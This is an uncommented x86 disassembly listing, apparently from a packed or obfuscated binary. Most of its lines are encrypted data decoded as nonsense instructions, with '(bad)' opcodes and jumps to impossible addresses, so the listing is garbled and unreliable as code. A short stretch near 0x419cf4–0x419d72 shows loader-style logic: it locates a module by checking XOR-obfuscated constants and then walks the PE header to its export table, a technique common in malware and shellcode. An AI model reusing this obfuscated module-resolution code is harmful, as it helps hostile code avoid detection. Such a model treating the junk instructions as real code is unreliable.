  419ca4:	jmp    0xf6f5:0xa3687b1b
  419cab:	js     0x419c3a
  419cad:	pop    ebx
  419cae:	(bad)  
  419caf:	(bad)  
  419cb0:	ja     0x419d01
  419cb2:	inc    edi
  419cb3:	retf   
  419cb4:	fsub   QWORD PTR [eax+0x2b]
  419cb7:	mov    eax,0xd7bdcd7c
  419cbc:	fadd   DWORD PTR [ebp+0x6c79a7b8]
  419cc2:	push   0xffffff88
  419cc4:	fidiv  WORD PTR [esi]
  419cc6:	retf   0x6a91
  419cc9:	xchg   edi,eax
  419cca:	cli    
  419ccb:	jge    0x419c7f
  419ccd:	mov    al,ds:0x80b9ffb0
  419cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cd3:	jge    0x419d14
  419cd5:	imul   ecx,ebx,0x11
  419cd8:	push   edi
  419cd9:	rcr    DWORD PTR [ebx],cl
  419cdb:	sbb    DWORD PTR [edx-0x63194839],edi
  419ce1:	dec    ecx
  419ce2:	js     0x419c78
  419ce4:	xor    bl,BYTE PTR [ecx+0x1f]
  419ce7:	stos   BYTE PTR es:[edi],al
  419ce8:	push   esi
  419ce9:	out    0xdb,eax
  419ceb:	loopne 0x419c78
  419ced:	pop    ebp
  419cee:	fmul   DWORD PTR [ebx-0x39dc2383]
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	xchg   ebx,eax
  419d84:	lock neg BYTE PTR [esi]
  419d87:	cmc    
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0x22bd192c
  419d90:	clc    
  419d91:	out    dx,eax
  419d92:	inc    ebx
  419d93:	adc    al,0x51
  419d95:	and    ecx,DWORD PTR [eax+0x37a097f2]
  419d9b:	mov    al,0xe9
  419d9d:	and    DWORD PTR ds:0xb57c53f1,edx
  419da3:	adc    dh,BYTE PTR [edi]
  419da5:	rcr    DWORD PTR es:[ebx],cl
  419da8:	and    eax,0x2e20070d
  419dad:	sahf   
  419dae:	das    
  419daf:	jno    0x419d85
  419db1:	xchg   ebx,eax
  419db2:	jmp    0xb48367c7
  419db7:	push   es
  419db8:	sub    esi,esi
  419dba:	shl    BYTE PTR [esi],1
  419dbc:	test   eax,0xcce45b1f
  419dc1:	popa   
  419dc2:	(bad)  
  419dc3:	pop    ebp
  419dc4:	ret    0x4e8
  419dc7:	jp     0x419d6e
  419dc9:	xor    DWORD PTR ds:0x17d9d85b,ebx
  419dcf:	mov    ch,0x5e
  419dd1:	xchg   edi,eax
  419dd2:	jl     0x419d84
  419dd4:	shr    BYTE PTR [ecx-0x19798d],0xb2
  419ddb:	loop   0x419d97
  419ddd:	fst    DWORD PTR ds:0xdbdf4bc6
  419de4:	sub    DWORD PTR [ebp-0x2abb7496],eax
  419dea:	cmp    ch,BYTE PTR [esi-0x6c]
  419ded:	in     eax,0x65
  419def:	retf   
  419df0:	and    al,0x56
  419df2:	dec    ebp
  419df3:	and    al,0xa6
  419df5:	int    0xc9
  419df7:	sbb    bl,BYTE PTR [esi]
  419df9:	enter  0xb6b8,0xe2
  419dfd:	mov    BYTE PTR [eax+0x64bf9e09],ch
  419e03:	jns    0x419e26
  419e05:	xor    eax,0x3f283902
  419e0a:	jge    0x419de8
  419e0c:	inc    eax
  419e0d:	ret    
  419e0e:	pop    esi
  419e0f:	add    edi,ecx
  419e11:	cld    
  419e12:	fwait
  419e13:	cmovle eax,DWORD PTR [esi+0x14]
  419e17:	(bad)  
  419e18:	jmp    0x419e45
  419e1a:	sub    ch,BYTE PTR [edx+0x69]
  419e1d:	cmp    ebx,eax
  419e1f:	imul   eax,DWORD PTR [ebp+0x3e],0x5dd9faa7
  419e26:	js     0x419dd6
  419e28:	and    edx,DWORD PTR [ebp+0x37a0706f]
  419e2e:	fwait
  419e2f:	jecxz  0x419eac
  419e31:	(bad)  
  419e32:	xor    bl,BYTE PTR [ecx]
  419e34:	add    ch,bl
  419e36:	and    al,bl
  419e38:	ficomp WORD PTR [eax]
  419e3a:	into   
  419e3b:	jp     0x419e42
  419e3d:	and    DWORD PTR [eax-0x53312376],ebp
  419e43:	popf   
  419e44:	aad    0x96
  419e46:	or     al,0x37
  419e48:	mov    cl,0x89
  419e4a:	ds je  0x419e60
  419e4d:	mov    eax,0x7d01ba7f
  419e52:	cs loopne 0x419e41
  419e55:	inc    edi
  419e56:	push   ebx
  419e57:	mov    dh,0x63
  419e59:	fst    QWORD PTR [eax-0x2a]
  419e5c:	mov    DWORD PTR [ebp-0x6c4c96c5],edx
  419e62:	inc    ebp
  419e63:	mov    al,ds:0xb396bc9a
  419e68:	ins    BYTE PTR es:[edi],dx
  419e69:	push   esi
  419e6a:	mov    esp,0x5e54e675
  419e6f:	push   cs
  419e70:	mov    esp,0xd9129441
  419e75:	and    edx,ebx
  419e77:	mov    cl,0x35
  419e79:	(bad)  
  419e7a:	push   eax
  419e7b:	test   eax,0xe168b68a
  419e80:	pop    bp
  419e82:	add    al,0x15
  419e84:	outs   dx,BYTE PTR ds:[esi]
  419e85:	or     cx,WORD PTR [esi-0x5862493f]
  419e8c:	cmp    DWORD PTR [ebp+edx*1-0x70704a25],0x1774ca
  419e97:	xchg   ch,bl
  419e99:	iret   
  419e9a:	push   esi
  419e9b:	imul   bh
  419e9d:	push   esp
  419e9e:	cmc    
  419e9f:	xchg   ebx,eax
  419ea0:	ins    DWORD PTR es:[edi],dx
  419ea1:	push   ebx
  419ea2:	jecxz  0x419e2f
  419ea4:	sahf   
  419ea5:	mov    edi,0xb577ed89
  419eaa:	dec    edx
  419eab:	cli    
  419eac:	add    al,0x73
  419eae:	js     0x419eea
  419eb0:	mov    ds:0xcfa7e423,eax
  419eb5:	dec    ebx
  419eb6:	adc    cl,BYTE PTR [esi-0x2c]
  419eb9:	sub    bl,BYTE PTR [esi+ebx*4]
  419ebc:	iret   
  419ebd:	adc    eax,0x9965eabf
  419ec2:	or     BYTE PTR [eax+eax*4-0x5],dh
  419ec6:	push   esp
  419ec7:	int    0xb8
  419ec9:	jnp    0x419ec0
  419ecb:	pusha  
  419ecc:	and    bl,BYTE PTR [esi-0x304859a6]
  419ed2:	add    BYTE PTR [ebx-0x78445bae],dl
  419ed8:	rcr    eax,cl
  419eda:	jl     0x419f52
  419edc:	xlat   BYTE PTR ds:[ebx]
  419edd:	ficomp WORD PTR [ebx]
  419edf:	push   ebx
  419ee0:	or     DWORD PTR [eax+0x5f],0xfffffff6
  419ee4:	aam    0xb1
  419ee6:	cmp    eax,0xbb710b74
  419eeb:	nop
  419eec:	push   ebp
  419eed:	jae    0x419eb5
  419eef:	leave  
  419ef0:	mov    ch,0x2a
  419ef2:	sahf   
  419ef3:	les    esp,FWORD PTR [esi+0x3b]
  419ef6:	xchg   DWORD PTR [edi+0x40],ebx
  419ef9:	les    ecx,FWORD PTR [edx]
  419efb:	inc    esp
  419efc:	mov    bh,BYTE PTR [edx-0x79cccafc]
  419f02:	in     eax,0x6e
  419f04:	data16 fisubr WORD PTR [ecx+0x61fa29ac]
  419f0b:	ret    0xee5f
  419f0e:	add    BYTE PTR [ecx-0x3a93fb5f],bl
  419f14:	pop    edi
  419f15:	inc    esp
  419f16:	xlat   BYTE PTR ds:[ebx]
  419f17:	xchg   DWORD PTR [eax],ebx
  419f19:	fcomi  st,st(0)
  419f1b:	and    al,0x38
  419f1d:	adc    DWORD PTR [ebp+0x12],eax
  419f20:	add    eax,0x5396704b
  419f25:	fdiv   QWORD PTR [eax+esi*8-0x2e872708]
  419f2c:	sub    DWORD PTR [edi+edi*2],esi
  419f2f:	dec    ecx
  419f30:	cmc    
  419f31:	jge    0x419faa
  419f33:	jle    0x419f8d
  419f35:	call   0xef3e1255
  419f3a:	cmp    esp,ebx
  419f3c:	sbb    bl,cl
  419f3e:	jo     0x419f91
  419f40:	push   esp
  419f41:	test   BYTE PTR [ebx+0x17ffdde5],al
  419f47:	sti    
  419f48:	dec    edx
  419f49:	dec    esi
  419f4a:	sub    bh,BYTE PTR [edi-0x27]
  419f4d:	mov    ds:0xbfb3a94,al
  419f52:	lock jmp 0x7927aac4
  419f58:	or     BYTE PTR ds:0xa7c6291f,0x6e
  419f5f:	adc    ebx,DWORD PTR [esi-0x26]
  419f62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f63:	xchg   eax,edi
  419f65:	sar    esi,1
  419f67:	std    
  419f68:	out    dx,al
  419f69:	push   eax
  419f6a:	or     BYTE PTR [esp+ecx*2+0x73bc826f],dl
  419f71:	das    
  419f72:	cmp    cl,cl
  419f74:	sub    eax,0x51076281
  419f79:	dec    esi
  419f7a:	mov    eax,0xa816a48c
  419f7f:	ds sbb bl,ah
  419f82:	push   cs
  419f83:	jb     0x419f38
  419f85:	mov    cl,0xbb
  419f87:	in     eax,0xd9
  419f89:	inc    ecx
  419f8a:	dec    eax
  419f8b:	stos   DWORD PTR es:[edi],eax
  419f8c:	sub    eax,0x24a51646
  419f91:	in     al,0xa9
  419f93:	jmp    0xfa59efdf
  419f98:	cmp    eax,DWORD PTR [ebx]
  419f9a:	ja     0x419f64
  419f9c:	push   cs
  419f9d:	push   esp
  419f9e:	ins    DWORD PTR es:[edi],dx
  419f9f:	jg     0x419fd9
  419fa1:	test   DWORD PTR [esi+edx*1],0xdaadf1db
  419fa8:	mov    ds:0xcc8e5593,eax
  419fad:	lods   eax,DWORD PTR ds:[esi]
  419fae:	add    al,0xd8
  419fb0:	(bad)  
  419fb1:	pop    ds
  419fb2:	out    0xaa,al
  419fb4:	jbe    0x41a01c
  419fb6:	xor    DWORD PTR [edx],edi
  419fb8:	(bad)  
  419fb9:	hlt    
  419fba:	push   ds
  419fbb:	ss es pop ebx
  419fbe:	cdq    
  419fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fc0:	dec    ebx
  419fc1:	push   0x7d
  419fc3:	sub    BYTE PTR [edi+0x43],dl
  419fc6:	xchg   esp,eax
  419fc7:	add    BYTE PTR ds:0xa7df5baf,ch
  419fcd:	jbe    0x41a011
  419fcf:	xlat   BYTE PTR ds:[ebx]
  419fd0:	inc    edx
  419fd1:	sahf   
  419fd2:	dec    esp
  419fd3:	push   0x38
  419fd5:	dec    ecx
  419fd6:	arpl   WORD PTR [edx-0x5735d239],cx
  419fdc:	sub    esp,ebx
  419fde:	fmul   QWORD PTR ds:0x798eb1e0
  419fe4:	addr16 jmp 0xe3f06969
  419fea:	in     eax,0x2a
  419fec:	dec    ebx
  419fed:	enter  0x98d5,0xde
  419ff1:	stos   BYTE PTR es:[edi],al
  419ff2:	pop    ebx
  419ff3:	push   ss
  419ff4:	call   0x3a0fe0b9
  419ff9:	cs dec edi
  419ffb:	cmp    al,0xd1
  419ffd:	mov    cl,0x10
  419fff:	inc    ecx
  41a000:	or     al,0xa9
  41a002:	iret   
  41a003:	xchg   esi,eax
  41a004:	mov    edx,esi
  41a006:	xor    ch,ch
  41a008:	jge    0x41a045
  41a00a:	push   edx
  41a00b:	hlt    
  41a00c:	pusha  
  41a00d:	jno    0x419fff
  41a00f:	xchg   DWORD PTR ds:0x2b64fb0b,ebp
  41a015:	or     esi,ebp
  41a017:	sub    al,0x9a
  41a019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a01a:	mov    dl,0xe5
  41a01c:	inc    ebp
  41a01d:	ins    DWORD PTR es:[edi],dx
  41a01e:	fild   WORD PTR [esi+0x3f7bfe75]
  41a024:	test   BYTE PTR [ebp-0x1c],cl
  41a027:	xchg   esi,eax
  41a028:	pop    ss
  41a029:	and    al,0x1b
  41a02b:	jg     0x419fb2
  41a02d:	fs jbe 0x41a058
  41a030:	sahf   
  41a031:	je     0x41a08b
  41a033:	mov    edx,0x5c12c236
  41a038:	dec    edi
  41a039:	(bad)  
  41a03a:	adc    eax,0x23d32c3c
  41a03f:	test   DWORD PTR [ecx],ecx
  41a041:	xlat   BYTE PTR ds:[bx]
  41a043:	leave  
  41a044:	fst    DWORD PTR [ecx+eiz*2]
  41a047:	cmp    dh,BYTE PTR [ebx+0x6e]
  41a04a:	xor    BYTE PTR [ecx-0x37f55961],0xb5
  41a051:	out    0x26,al
  41a053:	cmp    bh,BYTE PTR [eax-0x4ec3b393]
  41a059:	scas   eax,DWORD PTR es:[edi]
  41a05a:	sbb    BYTE PTR [ebp-0x7b],0x45
  41a05e:	ret    0x8581
  41a061:	dec    ebp
  41a062:	add    cl,BYTE PTR [ecx+0x3a]
  41a065:	shl    DWORD PTR [ebx-0x76949ec6],1
  41a06b:	mov    ds:0xa8a909fc,eax
  41a070:	(bad)  
  41a071:	(bad)  
  41a072:	xchg   ebp,eax
  41a073:	lock pop es
  41a075:	jl     0x41a03a
  41a077:	out    dx,eax
  41a078:	cmp    esi,DWORD PTR [edi-0x56]
  41a07b:	nop
  41a07c:	xor    DWORD PTR [ecx+edx*8+0x4991c674],ecx
  41a083:	add    eax,0x483c3c20
  41a088:	adc    BYTE PTR [eax],cl
  41a08a:	mov    WORD PTR [edi+ecx*8+0x6068d525],cs
  41a091:	sub    BYTE PTR [esi+edi*1+0x8],ah
  41a095:	(bad)
  41a09a:	lods   al,BYTE PTR ds:[esi]
  41a09b:	fldcw  WORD PTR [edx-0xc7b73e4]
  41a0a1:	adc    bh,BYTE PTR [edx+ecx*1]
  41a0a4:	pusha  
  41a0a5:	xchg   ecx,eax
  41a0a6:	(bad)  
  41a0a7:	jp     0x41a10b
  41a0a9:	ficom  WORD PTR [ebp-0x5f]
  41a0ac:	sbb    eax,0x3c999964
  41a0b1:	mov    ch,BYTE PTR [ebx]
  41a0b3:	(bad)  
  41a0b4:	and    cl,BYTE PTR [edi+0x39a4b7c6]
  41a0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0bb:	jbe    0x41a116
  41a0bd:	rcr    BYTE PTR [edi+0x1d],cl
  41a0c0:	xor    ecx,ecx
  41a0c2:	sar    ecx,0x10
  41a0c5:	and    DWORD PTR [ecx-0x6bb1077b],0x7cab94c2
  41a0cf:	xchg   esi,eax
  41a0d0:	and    DWORD PTR [eax+ebp*2-0xb434279],ebp
  41a0d7:	or     DWORD PTR [eax+ebx*2],ebp
  41a0da:	inc    esp
  41a0db:	add    al,0xe1
  41a0dd:	ins    BYTE PTR es:[edi],dx
  41a0de:	mov    ds:0xd9c6ad34,al
  41a0e3:	adc    DWORD PTR [eiz*1+0x4c0c41c1],esp
  41a0ea:	and    edx,DWORD PTR [ecx]
  41a0ec:	xchg   esi,eax
  41a0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0ee:	mov    cl,0x24
  41a0f0:	push   ds
  41a0f1:	(bad)  [esi+0x1]
  41a0f4:	add    esi,ecx
  41a0f6:	pop    ds
  41a0f7:	xchg   esi,eax
  41a0f8:	or     al,0x53
  41a0fa:	or     BYTE PTR [eax],al
  41a0fc:	pushf  
  41a0fd:	jbe    0x41a0d0
  41a0ff:	cdq    
  41a100:	out    0xdd,eax
  41a102:	mov    dh,0x14
  41a104:	or     ah,BYTE PTR [eax]
  41a106:	push   esp
  41a107:	leave  
  41a108:	sbb    al,0x19
  41a10a:	mov    ecx,DWORD PTR [ebx-0x31]
  41a10d:	cli    
  41a10e:	imul   edi,DWORD PTR [ecx],0xfffffff7
  41a111:	xchg   ebp,eax
  41a112:	das    
  41a113:	loopne 0x41a0bf
  41a115:	xchg   DWORD PTR [ebx],ebx
  41a117:	dec    esp
  41a118:	xor    ebx,DWORD PTR es:[ebx-0x6d]
  41a11c:	push   cs
  41a11d:	mov    bl,0x60
  41a11f:	inc    esi
  41a120:	push   ss
  41a121:	pop    ebp
  41a122:	lock mov ch,al
  41a125:	xchg   esi,eax
  41a126:	dec    esi
  41a127:	fnstsw WORD PTR [eax+ecx*8-0x7b]
  41a12b:	fwait
  41a12c:	scas   al,BYTE PTR es:[edi]
  41a12d:	stos   DWORD PTR es:[edi],eax
  41a12e:	pop    esp
  41a12f:	jb     0x41a157
  41a131:	mov    edi,0xd5c702db
  41a136:	mov    ecx,0x7470579b
  41a13b:	aaa    
  41a13c:	mov    ah,BYTE PTR [ebx]
  41a13e:	jge    0x41a14d
  41a140:	aam    0xf3
  41a142:	fcomp  st(5)
  41a144:	fbstp  TBYTE PTR [eax]
  41a146:	push   edx
  41a147:	xor    edi,DWORD PTR [ebx+eiz*8-0x2e460970]
  41a14e:	fcomp  st(2)
  41a150:	seto   BYTE PTR [edi]
  41a153:	popa   
  41a154:	push   cs
  41a155:	inc    ebp
  41a156:	(bad)  
  41a157:	jmp    0x3e8b9212
  41a15c:	test   DWORD PTR [edx-0x66],ebx
  41a15f:	xor    DWORD PTR [ecx+0x10b0f90],ebx
  41a165:	sub    cl,dl
  41a167:	inc    edi
  41a168:	dec    esi
  41a169:	popa   
  41a16a:	stos   DWORD PTR es:[edi],eax
  41a16b:	in     eax,0xf4
  41a16d:	fist   WORD PTR [ecx]
  41a16f:	ret    0x6be9
  41a172:	cdq    
  41a173:	sar    BYTE PTR [ebp-0x74],cl
  41a176:	sbb    ebx,DWORD PTR [esi+0x6e]
  41a179:	lods   eax,DWORD PTR ds:[esi]
  41a17a:	(bad)  
  41a17b:	aam    0x16
  41a17d:	inc    edi
  41a17e:	mov    dh,BYTE PTR [esi]
  41a180:	adc    eax,0xc15f3ab5
  41a185:	jno    0x41a1d8
  41a187:	fstp   TBYTE PTR [ebx+ebp*8]
  41a18a:	mov    eax,ds:0x7d34d5a3
  41a18f:	fs mov ebp,0x9143f029
  41a195:	and    edx,DWORD PTR [edi]
  41a197:	pop    edx
  41a198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a199:	mov    BYTE PTR [esi+0x1cc8d336],ah
  41a19f:	lock mov ds:0xfefb6762,eax
  41a1a5:	push   ecx
  41a1a6:	repz mov esi,0x975525f4
  41a1ac:	mov    eax,ds:0x63e8757a
  41a1b1:	xor    DWORD PTR [ebx+0x6ede53a5],0xffffff94
  41a1b8:	lahf   
  41a1b9:	fs pop eax
  41a1bb:	mov    ds:0xe5368e95,al
  41a1c0:	dec    edi
  41a1c1:	mov    WORD PTR [edx-0x1a],es
  41a1c4:	jo     0x41a240
  41a1c6:	ror    BYTE PTR [eax-0x5c],1
  41a1c9:	adc    eax,0x614b904
  41a1ce:	xor    ebp,ebx
  41a1d0:	xchg   ecx,eax
  41a1d1:	cmp    eax,0x8aacbe04
  41a1d6:	lods   eax,DWORD PTR ds:[esi]
  41a1d7:	aad    0x1a
  41a1d9:	in     eax,dx
  41a1da:	add    eax,0xb6ddf61e
  41a1df:	mov    dl,0x49
  41a1e1:	cwde   
  41a1e2:	call   0x74c24ea6
  41a1e7:	or     edx,ebx
  41a1e9:	int3   
  41a1ea:	push   esp
  41a1eb:	cmp    ebp,ebp
  41a1ed:	fs mov edi,0xfa06bfbb
  41a1f3:	aad    0x92
  41a1f5:	in     al,0x24
  41a1f7:	jl     0x41a277
  41a1f9:	jae    0x41a1ac
  41a1fb:	cmp    eax,0x7aff5838
  41a200:	mov    ch,0x8c
  41a202:	jp     0x41a18d
  41a204:	mov    dh,0xbd
  41a206:	fsub   DWORD PTR [edx+0x5c]
  41a209:	(bad)  [eax+0x7d6b2fe5]
  41a20f:	fs leave 
  41a211:	(bad)  
  41a212:	xchg   edi,eax
  41a213:	push   esp
  41a214:	pop    ecx
  41a215:	(bad)  
  41a216:	mov    cl,0x43
  41a218:	push   edi
  41a219:	mov    BYTE PTR [ecx-0x70],dl
  41a21c:	test   BYTE PTR [ecx+0x24],al
  41a21f:	xchg   edx,edx
  41a221:	inc    esp
  41a222:	vpunpckhbw ymm1,ymm5,ymm1
  41a226:	sbb    ch,dh
  41a228:	mov    DWORD PTR [edi],edx
  41a22a:	push   es
  41a22b:	dec    esp
  41a22c:	hlt    
  41a22d:	inc    ebx
  41a22e:	(bad)  
  41a22f:	or     ebp,DWORD PTR [ebp+0x2ea4f370]
  41a235:	out    0x43,eax
  41a237:	or     dl,BYTE PTR [edi]
  41a239:	jmp    0x41a27a
  41a23b:	lds    ebp,FWORD PTR [ecx-0x52]
  41a23e:	or     bl,BYTE PTR [esi-0x6e]
  41a241:	and    BYTE PTR [esi-0x21],bh
  41a244:	pop    ebp
  41a245:	mov    bl,BYTE PTR [ebx+ecx*8-0x38]
  41a249:	or     eax,0xf1ff8db9
  41a24e:	jae    0x41a1fb
  41a250:	mov    edi,0xc39684ce
  41a255:	or     eax,0xf7618a78
  41a25a:	mov    ah,BYTE PTR [ebp-0xfad444]
  41a260:	cmp    BYTE PTR [ebp-0x25],bl
  41a263:	push   ss
  41a264:	xchg   esp,eax
  41a265:	in     eax,dx
  41a266:	mov    edi,0x12e86789
  41a26b:	addr16 mov ch,0x3c
  41a26e:	xchg   ebx,eax
  41a26f:	gs mov edi,0x60ee93b6
  41a275:	lods   al,BYTE PTR ds:[esi]
  41a276:	std    
  41a277:	lea    esp,[esi]
  41a279:	mov    ebx,0x16eaa37a
  41a27e:	ins    DWORD PTR es:[edi],dx
  41a27f:	and    DWORD PTR [ecx+0x61db856f],edi
  41a285:	or     eax,0xd3186215
  41a28a:	cmc    
  41a28b:	adc    esi,DWORD PTR [ecx+ebx*1+0x13]
  41a28f:	jb     0x41a262
  41a291:	js     0x41a2c0
  41a293:	mov    al,0x58
  41a295:	push   ss
  41a296:	jp     0x41a260
  41a298:	add    BYTE PTR [ecx+0x7e],ch
  41a29b:	bound  esi,QWORD PTR [ebx]
  41a29d:	sbb    edi,DWORD PTR [ecx+0x73]
  41a2a0:	push   cs
  41a2a1:	mov    ds:0x9cea91d3,eax
  41a2a6:	sbb    al,0x9b
  41a2a8:	jbe    0x41a24a
  41a2aa:	pop    esp
  41a2ab:	pusha  
  41a2ac:	xchg   edx,eax
  41a2ad:	repz pusha 
  41a2af:	adc    BYTE PTR [eax-0x5b65152b],al
  41a2b5:	inc    edi
  41a2b6:	outs   dx,DWORD PTR ds:[esi]
  41a2b7:	jne    0x41a32b
  41a2b9:	pusha  
  41a2ba:	iret   
  41a2bb:	aas    
  41a2bc:	stos   BYTE PTR es:[edi],al
  41a2bd:	std    
  41a2be:	(bad)  
  41a2bf:	out    dx,eax
  41a2c0:	push   ss
  41a2c1:	cdq    
  41a2c2:	fwait
  41a2c3:	push   ecx
  41a2c4:	jecxz  0x41a2d5
  41a2c6:	clc    
  41a2c7:	ret    0x6c1b
  41a2ca:	mov    cl,0x97
  41a2cc:	shl    DWORD PTR [ebx+ebp*1-0x1087d002],1
  41a2d3:	xor    al,0x54
  41a2d5:	dec    ecx
  41a2d6:	(bad)  
  41a2d7:	cmc    
  41a2d8:	mov    bh,0x97
  41a2da:	in     eax,0x1a
  41a2dc:	xor    eax,edx
  41a2de:	pop    ds
  41a2df:	gs sub al,0xc6
  41a2e2:	jp     0x41a2ea
  41a2e4:	jae    0x41a299
  41a2e6:	add    bl,0x29
  41a2e9:	xchg   esi,eax
  41a2ea:	jnp    0x41a355
  41a2ec:	xor    BYTE PTR [ebx+0x7c60616d],ch
  41a2f2:	cdq    
  41a2f3:	(bad)  
  41a2f4:	jmp    0xfd2d:0xb1f67fb8
  41a2fb:	add    dl,BYTE PTR [edi+ecx*4]
  41a2fe:	dec    esp
  41a2ff:	inc    ebp
  41a300:	out    0x80,al
  41a302:	arpl   WORD PTR [ecx+0x3b],bx
  41a305:	jb     0x41a2b2
  41a307:	push   ecx
  41a308:	mov    eax,esi
  41a30a:	push   cs
  41a30b:	retf   0xaa30
  41a30e:	jnp    0x41a30c
  41a310:	dec    esp
  41a311:	ror    ebp,1
  41a313:	pop    ecx
  41a314:	shr    BYTE PTR [edi-0xc],cl
  41a317:	push   esi
  41a318:	or     edi,DWORD PTR [esi-0x7d]
  41a31b:	mov    WORD PTR [ebx+0x58],ss
  41a31e:	inc    edi
  41a31f:	cmp    eax,0x35242869
  41a324:	mov    ds:0x70f79db,al
  41a329:	loope  0x41a356
  41a32b:	es adc al,0x98
  41a32e:	cli    
  41a32f:	stos   BYTE PTR es:[edi],al
  41a330:	ret    0xa6ec
  41a333:	cli    
  41a334:	push   edx
  41a335:	mov    BYTE PTR [edi-0x5dd81d6c],cl
  41a33b:	jmp    0x9f876889
  41a340:	stos   BYTE PTR es:[edi],al
  41a341:	sbb    edx,DWORD PTR [edi]
  41a343:	popf   
  41a344:	mov    bl,0x85
  41a346:	sar    al,0x38
  41a349:	xor    di,di
  41a34c:	dec    BYTE PTR [edx-0x77edc5f6]
  41a352:	loopne 0x41a31a
  41a354:	jbe    0x41a397
  41a356:	xchg   esp,eax
  41a357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a358:	or     DWORD PTR [ecx-0x78],edi
  41a35b:	bound  edx,QWORD PTR [eax+0x67]
  41a35e:	mov    eax,ds:0xabb41342
  41a363:	in     eax,0xc5
  41a365:	lods   al,BYTE PTR ds:[esi]
  41a366:	nop
  41a367:	mov    ds:0x49e986be,eax
  41a36c:	push   ss
  41a36d:	sbb    eax,0xa0d90058
  41a372:	andnps xmm4,xmm5
  41a375:	pop    edi
  41a376:	mov    ah,0x2f
  41a378:	das    
  41a379:	xchg   BYTE PTR [edi],bh
  41a37b:	mov    bl,0xc4
  41a37d:	je     0x41a34e
  41a37f:	in     eax,dx
  41a380:	jmp    0x66e2:0xb1250cab
  41a387:	sar    esi,0xde
  41a38a:	and    esi,DWORD PTR [eax+0x53329b69]
  41a390:	in     al,0x14
  41a392:	bound  ecx,QWORD PTR [edi]
  41a394:	bound  ebx,QWORD PTR [eax-0x2a850db1]
  41a39a:	outs   dx,BYTE PTR ds:[esi]
  41a39b:	daa    
  41a39c:	push   ss
  41a39d:	and    DWORD PTR [esi+ebx*4-0x2b],0xffffff86
  41a3a2:	es mov ebp,0xd4d92c8e
  41a3a8:	fdiv   QWORD PTR [esi-0x56]
  41a3ab:	pop    es
  41a3ac:	(bad)  
  41a3ad:	in     al,0x53
  41a3af:	sub    DWORD PTR [edi+0x6550cbd2],edi
  41a3b5:	cmp    ebx,DWORD PTR [edx-0x4fdd2465]
  41a3bb:	mov    al,0xd1
  41a3bd:	out    dx,eax
  41a3be:	dec    ebx
  41a3bf:	out    dx,al
  41a3c0:	outs   dx,DWORD PTR ds:[esi]
  41a3c1:	daa    
  41a3c2:	sub    eax,0xf9d97c26
  41a3c7:	mov    DWORD PTR [edi],esp
  41a3c9:	or     eax,0x7d16babc
  41a3ce:	sahf   
  41a3cf:	push   ss
  41a3d0:	test   al,0x5
  41a3d2:	ja     0x41a43d
  41a3d4:	(bad)  
  41a3d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3d6:	jo     0x41a3b6
  41a3d8:	adc    al,0x5a
  41a3da:	js     0x41a448
  41a3dc:	lahf   
  41a3dd:	dec    esp
  41a3de:	ins    DWORD PTR es:[edi],dx
  41a3df:	pusha  
  41a3e0:	mov    ds:0x5bb37985,eax
  41a3e5:	jle    0x41a3ae
  41a3e7:	pop    ebp
  41a3e8:	mov    WORD PTR [edi+0x2e81a66e],ds
  41a3ee:	xor    eax,0x7007b92a
  41a3f3:	shr    bl,1
  41a3f5:	push   eax
  41a3f6:	stc    
  41a3f7:	mov    cl,0x82
  41a3f9:	loopne 0x41a3b7
  41a3fb:	into   
  41a3fc:	out    dx,al
  41a3fd:	or     ebp,DWORD PTR [ebx]
  41a3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a400:	xor    BYTE PTR [ebx+0x23],0xc1
  41a404:	into   
  41a405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a406:	in     al,0x1f
  41a408:	retf   
  41a409:	lods   eax,DWORD PTR ds:[esi]
  41a40a:	mov    ebx,0x333ce7e3
  41a40f:	repnz fwait
  41a411:	push   cs
  41a412:	(bad)  
  41a413:	adc    BYTE PTR [eax+0x63],dl
  41a416:	sub    eax,0x4482aad9
  41a41b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a41c:	sub    al,0xe8
  41a41e:	es inc eax
  41a420:	je     0x41a45e
  41a422:	ror    BYTE PTR [edx+edx*2-0xa],cl
  41a426:	fldenv [esi]
